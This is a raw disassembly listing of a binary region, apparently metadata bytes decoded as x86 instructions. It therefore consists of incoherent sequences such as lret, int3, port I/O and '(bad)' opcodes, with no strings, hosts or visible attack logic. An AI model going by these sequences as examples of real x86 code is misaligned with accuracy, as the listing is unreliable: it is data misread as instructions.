  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 49 0f             	add    %cl,0xf(%ecx)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 62 0c             	add    %ah,0xc(%edx)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 3e                	add    %bh,(%esi)
  406a47:	1d d2 02 64 00       	sbb    $0x6402d2,%eax
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 df                	add    %bl,%bh
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 2f                	add    %ch,(%edi)
  406a63:	06                   	push   %es
  406a64:	e1 02                	loope  0x406a68
  406a66:	68 00 e6 25 00       	push   $0x25e600
  406a6b:	00 00                	add    %al,(%eax)
  406a6d:	00 96 00 6c 10 e8    	add    %dl,-0x17ef9400(%esi)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 ac 13 f6 02 6e 00 	add    %ch,0x6e02f6(%ebx,%edx,1)
  406a92:	78 20                	js     0x406ab4
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	09 15 0e 00 70 00    	or     %edx,0x70000e
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 6f 18             	add    %ch,0x18(%edi)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 66 18             	add    %ah,0x18(%esi)
  406ab8:	84 01                	test   %al,(%ecx)
  406aba:	71 00                	jno    0x406abc
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	cb                   	lret
  406ac1:	0a 00                	or     (%eax),%al
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 cb                	add    %cl,%bl
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 cb                	add    %cl,%bl
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 cb                	add    %cl,%bl
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 cb                	add    %cl,%bl
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 cb                	add    %cl,%bl
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 cb                	add    %cl,%bl
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 cb                	add    %cl,%bl
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 cb                	add    %cl,%bl
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 cb                	add    %cl,%bl
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 ac 07 00 00 01 00 	add    %ch,0x10000(%edi,%eax,1)
  406b02:	56                   	push   %esi
  406b03:	13 00                	adc    (%eax),%eax
  406b05:	00 02                	add    %al,(%edx)
  406b07:	00 b1 08 00 00 03    	add    %dh,0x3000008(%ecx)
  406b0d:	00 b4 10 00 00 04 00 	add    %dh,0x40000(%eax,%edx,1)
  406b14:	26 18 00             	sbb    %al,%es:(%eax)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 d6                	add    %dl,%dh
  406b1b:	12 00                	adc    (%eax),%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 1d 0d 00 00 01    	add    %bl,0x100000d
  406b25:	00 c3                	add    %al,%bl
  406b27:	0d 00 00 01 00       	or     $0x10000,%eax
  406b2c:	c3                   	ret
  406b2d:	0d 00 00 01 00       	or     $0x10000,%eax
  406b32:	2d 0d 00 00 01       	sub    $0x100000d,%eax
  406b37:	00 d8                	add    %bl,%al
  406b39:	18 00                	sbb    %al,(%eax)
  406b3b:	00 01                	add    %al,(%ecx)
  406b3d:	00 c9                	add    %cl,%cl
  406b3f:	04 00                	add    $0x0,%al
  406b41:	00 02                	add    %al,(%edx)
  406b43:	00 01                	add    %al,(%ecx)
  406b45:	1c 00                	sbb    $0x0,%al
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 66 1b             	add    %ah,0x1b(%esi)
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	34 07                	xor    $0x7,%al
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	41                   	inc    %ecx
  406b57:	18 00                	sbb    %al,(%eax)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 24 1b             	add    %ah,(%ebx,%ebx,1)
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	ff 16                	call   *(%esi)
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 56 13             	add    %dl,0x13(%esi)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	6f                   	outsl  %ds:(%esi),(%dx)
  406b81:	0b 00                	or     (%eax),%eax
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 ac 07 00 00 02 00 	add    %ch,0x20000(%edi,%eax,1)
  406b8c:	cb                   	lret
  406b8d:	0a 00                	or     (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 cb                	add    %cl,%bl
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 ac 07 00 00 01 00 	add    %ch,0x10000(%edi,%eax,1)
  406b9e:	bd 02 00 00 01       	mov    $0x1000002,%ebp
  406ba3:	00 2a                	add    %ch,(%edx)
  406ba5:	0e                   	push   %cs
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	49                   	dec    %ecx
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 e5                	add    %ah,%ch
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bbb:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bc1:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bc7:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bdf:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406be5:	00 c3                	add    %al,%bl
  406be7:	18 00                	sbb    %al,(%eax)
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 53 16             	add    %dl,0x16(%ebx)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	cf                   	iret
  406bf3:	16                   	push   %ss
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	cf                   	iret
  406bf9:	16                   	push   %ss
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	06                   	push   %es
  406bff:	1c 00                	sbb    $0x0,%al
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 06                	add    %al,(%esi)
  406c05:	1c 00                	sbb    $0x0,%al
  406c07:	00 01                	add    %al,(%ecx)
  406c09:	00 06                	add    %al,(%esi)
  406c0b:	1c 00                	sbb    $0x0,%al
  406c0d:	00 01                	add    %al,(%ecx)
  406c0f:	00 06                	add    %al,(%esi)
  406c11:	1c 00                	sbb    $0x0,%al
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 06                	add    %al,(%esi)
  406c17:	1c 00                	sbb    $0x0,%al
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 c3                	add    %al,%bl
  406c1d:	0d 00 00 01 00       	or     $0x10000,%eax
  406c22:	b0 0d                	mov    $0xd,%al
  406c24:	00 00                	add    %al,(%eax)
  406c26:	02 00                	add    (%eax),%al
  406c28:	bb 0d 00 00 01       	mov    $0x100000d,%ebx
  406c2d:	00 cb                	add    %cl,%bl
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 cb                	add    %cl,%bl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 cb                	add    %cl,%bl
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 2f                	add    %ch,(%edi)
  406c41:	1c 00                	sbb    $0x0,%al
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 cb                	add    %cl,%bl
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 ac 07 00 00 01 00 	add    %ch,0x10000(%edi,%eax,1)
  406c52:	ac                   	lods   %ds:(%esi),%al
  406c53:	07                   	pop    %es
  406c54:	00 00                	add    %al,(%eax)
  406c56:	01 00                	add    %eax,(%eax)
  406c58:	c0 17 00             	rclb   $0x0,(%edi)
  406c5b:	00 01                	add    %al,(%ecx)
  406c5d:	00 c0                	add    %al,%al
  406c5f:	17                   	pop    %ss
  406c60:	00 00                	add    %al,(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	cb                   	lret
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 cb                	add    %cl,%bl
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 cb                	add    %cl,%bl
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 fc                	add    %bh,%ah
  406c77:	1c 00                	sbb    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 cb                	add    %cl,%bl
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 fc                	add    %bh,%ah
  406c83:	1c 00                	sbb    $0x0,%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 cb                	add    %cl,%bl
  406c89:	0a 00                	or     (%eax),%al
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 2b                	add    %ch,(%ebx)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	2b 07                	sub    (%edi),%eax
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	6f                   	outsl  %ds:(%esi),(%dx)
  406c9b:	0d 00 00 01 00       	or     $0x10000,%eax
  406ca0:	cb                   	lret
  406ca1:	0a 00                	or     (%eax),%al
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 70 0e             	add    %dh,0xe(%eax)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	75 0e                	jne    0x406cbc
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	75 0e                	jne    0x406cc2
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	cf                   	iret
  406cb9:	16                   	push   %ss
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	2b 07                	sub    (%edi),%eax
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	c0 17 00             	rclb   $0x0,(%edi)
  406cc7:	00 01                	add    %al,(%ecx)
  406cc9:	00 c0                	add    %al,%al
  406ccb:	17                   	pop    %ss
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	cb                   	lret
  406cd1:	0a 00                	or     (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 cb                	add    %cl,%bl
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 cb                	add    %cl,%bl
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 c0                	add    %al,%al
  406ce3:	17                   	pop    %ss
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	98                   	cwtl
  406ce9:	10 00                	adc    %al,(%eax)
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 c0                	add    %al,%al
  406cef:	17                   	pop    %ss
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	01 00                	add    %eax,(%eax)
  406cf4:	79 0b                	jns    0x406d01
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	c0 17 00             	rclb   $0x0,(%edi)
  406cfd:	00 01                	add    %al,(%ecx)
  406cff:	00 c0                	add    %al,%al
  406d01:	17                   	pop    %ss
  406d02:	00 00                	add    %al,(%eax)
  406d04:	01 00                	add    %eax,(%eax)
  406d06:	c0 17 00             	rclb   $0x0,(%edi)
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 7f 0e             	add    %bh,0xe(%edi)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	c0 17 00             	rclb   $0x0,(%edi)
  406d15:	00 02                	add    %al,(%edx)
  406d17:	00 c6                	add    %al,%dh
  406d19:	16                   	push   %ss
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	c0 17 00             	rclb   $0x0,(%edi)
  406d21:	00 02                	add    %al,(%edx)
  406d23:	00 75 0e             	add    %dh,0xe(%ebp)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	c0 17 00             	rclb   $0x0,(%edi)
  406d2d:	00 02                	add    %al,(%edx)
  406d2f:	00 75 0e             	add    %dh,0xe(%ebp)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	c0 17 00             	rclb   $0x0,(%edi)
  406d39:	00 02                	add    %al,(%edx)
  406d3b:	00 70 0e             	add    %dh,0xe(%eax)
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	c0 17 00             	rclb   $0x0,(%edi)
  406d45:	00 02                	add    %al,(%edx)
  406d47:	00 7a 0e             	add    %bh,0xe(%edx)
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	c0 17 00             	rclb   $0x0,(%edi)
  406d51:	00 02                	add    %al,(%edx)
  406d53:	00 7a 0e             	add    %bh,0xe(%edx)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	b9 1b 00 00 01       	mov    $0x100001b,%ecx
  406d5f:	00 b9 1b 16 00 59    	add    %bh,0x5900161b(%ecx)
  406d65:	00 18                	add    %bl,(%eax)
  406d67:	00 5d 00             	add    %bl,0x0(%ebp)
  406d6a:	b1 00                	mov    $0x0,%cl
  406d6c:	f2 1a bb 01 b1 00 de 	repnz sbb -0x21ff4eff(%ebx),%bh
  406d73:	1b bf 01 b1 00 cd    	sbb    -0x32ff4eff(%edi),%edi
  406d79:	19 0e                	sbb    %ecx,(%esi)
  406d7b:	00 b9 00 f1 14 64    	add    %bh,0x6414f100(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 09                	add    %cl,(%ecx)
  406d85:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d8a:	09 15 0e 00 d9 00    	or     %edx,0xd9000e
  406d90:	09 15 2e 03 e9 00    	or     %edx,0xe9032e
  406d96:	09 15 6b 01 f1 00    	or     %edx,0xf1016b
  406d9c:	09 15 6b 01 f9 00    	or     %edx,0xf9016b
  406da2:	09 15 6b 01 01 01    	or     %edx,0x101016b
  406da8:	09 15 6b 01 09 01    	or     %edx,0x109016b
  406dae:	09 15 6b 01 11 01    	or     %edx,0x111016b
  406db4:	09 15 6b 01 19 01    	or     %edx,0x119016b
  406dba:	09 15 6b 01 21 01    	or     %edx,0x121016b
  406dc0:	09 15 6b 01 29 01    	or     %edx,0x129016b
  406dc6:	09 15 6b 01 31 01    	or     %edx,0x131016b
  406dcc:	09 15 4b 02 39 01    	or     %edx,0x139024b
  406dd2:	09 15 0e 00 41 01    	or     %edx,0x141000e
  406dd8:	09 15 6b 01 49 01    	or     %edx,0x149016b
  406dde:	88 12                	mov    %dl,(%edx)
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 6e 00             	add    %ebp,0x0(%esi)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 f7                	add    %esi,%edi
  406deb:	19 7f 00             	sbb    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 79 10             	add    %edi,0x10(%ecx)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	09 15 0e 00 61 01    	or     %edx,0x161000e
  406dfc:	37                   	aaa
  406dfd:	01 cd                	add    %ecx,%ebp
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	28 0c 2a             	sub    %cl,(%edx,%ebp,1)
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	b7 0c                	mov    $0xc,%bh
  406e0a:	d3 03                	roll   %cl,(%ebx)
  406e0c:	11 00                	adc    %eax,(%eax)
  406e0e:	09 15 2b 02 11 00    	or     %edx,0x11022b
  406e14:	ce                   	into
  406e15:	1c d9                	sbb    $0xd9,%al
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	99                   	cltd
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	bd 16 e5 03 81       	mov    $0x8103e516,%ebp
  406e25:	01 e2                	add    %esp,%edx
  406e27:	01 c7                	add    %eax,%edi
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	3f                   	aas
  406e2d:	0d eb 03 19 00       	or     $0x1903eb,%eax
  406e32:	09 15 09 04 19 00    	or     %edx,0x190409
  406e38:	4f                   	dec    %edi
  406e39:	0b 01                	or     (%ecx),%eax
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 3c 0b             	add    %bh,(%ebx,%ecx,1)
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 73             	roll   $0x73,(%ecx)
  406e45:	1d 16 04 c1 01       	sbb    $0x1c10416,%eax
  406e4a:	e9 19 1c 04 d1       	jmp    0xd1448a68
  406e4f:	01 09                	add    %ecx,(%ecx)
  406e51:	15 0e 00 d1 01       	adc    $0x1d1000e,%eax
  406e56:	e2 1b                	loop   0x406e73
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 fa                	add    %edi,%edx
  406e5d:	15 28 04 19 00       	adc    $0x190428,%eax
  406e62:	50                   	push   %eax
  406e63:	19 30                	sbb    %esi,(%eax)
  406e65:	04 19                	add    $0x19,%al
  406e67:	00 3e                	add    %bh,(%esi)
  406e69:	03 bf 01 19 00 50    	add    0x50001901(%edi),%edi
  406e6f:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 09                	add    %ecx,(%ecx)
  406e75:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e7a:	09 15 36 02 99 01    	or     %edx,0x1990236
  406e80:	6a 17                	push   $0x17
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 53 0c             	add    %edx,0xc(%ebx)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 e9             	roll   $0xe9,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 e2                	add    %esp,%edx
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 6e 08             	add    %ebp,0x8(%esi)
  406e9a:	0e                   	push   %cs
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 09                	add    %ecx,(%ecx)
  406e9f:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406ea4:	09 15 56 04 21 00    	or     %edx,0x210456
  406eaa:	09 15 5c 04 19 00    	or     %edx,0x19045c
  406eb0:	36 1b 66 04          	sbb    %ss:0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	6e                   	outsb  %ds:(%esi),(%dx)
  406eb7:	0c 47                	or     $0x47,%al
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 72 1a             	add    %dh,0x1a(%edx)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 09                	add    (%ecx),%cl
  406ec3:	15 56 04 29 00       	adc    $0x290456,%eax
  406ec8:	09 15 78 04 31 02    	or     %edx,0x2310478
  406ece:	09 15 56 04 c1 00    	or     %edx,0xc10456
  406ed4:	11 03                	adc    %eax,(%ebx)
  406ed6:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406eda:	9e                   	sahf
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 7a 17             	add    %bh,0x17(%edx)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 6e 08             	add    %ch,0x8(%esi)
  406ee8:	0e                   	push   %cs
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 6e 08             	add    %ch,0x8(%esi)
  406eee:	0e                   	push   %cs
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 6e 08             	add    %ch,0x8(%esi)
  406ef4:	0e                   	push   %cs
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 09                	add    %cl,(%ecx)
  406ef9:	03 a1 04 49 02 6e    	add    0x6e024904(%ecx),%esp
  406eff:	00 a7 04 c1 00 16    	add    %ah,0x1600c104(%edi)
  406f05:	03 ae 04 51 02 09    	add    0x9025104(%esi),%ebp
  406f0b:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f10:	09 15 b6 04 49 01    	or     %edx,0x14904b6
  406f16:	9b                   	fwait
  406f17:	1b bd 04 61 02 8a    	sbb    -0x75fd9efc(%ebp),%edi
  406f1d:	14 cf                	adc    $0xcf,%al
  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 bd 16 9f 01 19    	add    0x19019f16(%ebp),%bh
  406f27:	00 44 0f d6          	add    %al,-0x2a(%edi,%ecx,1)
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 ec                	add    %ch,%ah
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 09                	add    (%ecx),%cl
  406f35:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f3a:	b0 11                	mov    $0x11,%al
  406f3c:	15 02 c1 00 4a       	adc    $0x4a00c102,%eax
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	f7 19                	negl   (%ecx)
  406f48:	9a 00 71 02 48 19 0a 	lcall  $0xa19,$0x48027100
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	d2 15 c7 00 a1 02    	rclb   %cl,0x2a100c7
  406f58:	e6 07                	out    %al,$0x7
  406f5a:	01 05 79 02 09 15    	add    %eax,0x15090279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 4a 18             	add    0x18(%edx),%cl
  406f66:	07                   	pop    %es
  406f67:	05 81 02 ac 06       	add    $0x6ac0281,%eax
  406f6c:	0d 05 a9 02 f5       	or     $0xf502a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 60 07 47    	add    0x47076002(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 7f 1d             	add    %edi,0x1d(%edi)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 ed                	add    %ch,%ch
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	3f                   	aas
  406f89:	0f 0e                	femms
  406f8b:	00 89 02 09 15 0e    	add    %cl,0xe150902(%ecx)
  406f91:	00 89 02 02 07 6b    	add    %cl,0x6b070202(%ecx)
  406f97:	01 b1 02 ec 06 47    	add    %esi,0x4706ec02(%ecx)
  406f9d:	02 a1 02 ec 10 c7    	add    -0x38ef13fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 c5                	add    %eax,%ebp
  406fa7:	18 1a                	sbb    %bl,(%edx)
  406fa9:	05 89 02 8d 18       	add    $0x188d0289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 c9                	add    %cl,%cl
  406fb3:	06                   	push   %es
  406fb4:	20 05 89 02 1c 1c    	and    %al,0x1c1c0289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 9b 1b 27    	add    0x271b9b02(%ecx),%al
  406fc1:	05 c1 02 66 14       	add    $0x146602c1,%eax
  406fc6:	30 05 c9 02 7c 08    	xor    %al,0x87c02c9
  406fcc:	c7 00 91 02 c3 1c    	movl   $0x1cc30291,(%eax)
  406fd2:	35 05 c1 01 c5       	xor    $0xc501c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 c2 0a       	add    $0xac20291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 ae 18       	add    $0x18ae02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	dc 08                	fmull  (%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 09                	add    (%ecx),%cl
  406fef:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ff4:	70 16                	jo     0x40700c
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 0f 07 c3       	mov    0xc3070f02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 c5                	add    %eax,%ebp
  407001:	18 01                	sbb    %al,(%ecx)
  407003:	05 99 02 09 15       	add    $0x15090299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 dc                	add    %ah,%bl
  40700d:	07                   	pop    %es
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 63 0d             	add    0xd(%ebx),%ah
  407014:	c3                   	ret
  407015:	00 a1 02 1f 07 c7    	add    %ah,-0x38f8e0fe(%ecx)
  40701b:	00 89 02 0d 0d 4b    	add    %cl,0x4b0d0d02(%ecx)
  407021:	02 89 02 7b 0a 4b    	add    0x4b0a7b02(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	a9 1b 3e 01 59       	test   $0x59013e1b,%eax
  40702f:	01 53 1d             	add    %edx,0x1d(%ebx)
  407032:	c3                   	ret
  407033:	00 a1 02 6c 1b c7    	add    %ah,-0x38e493fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 09                	add    (%ecx),%cl
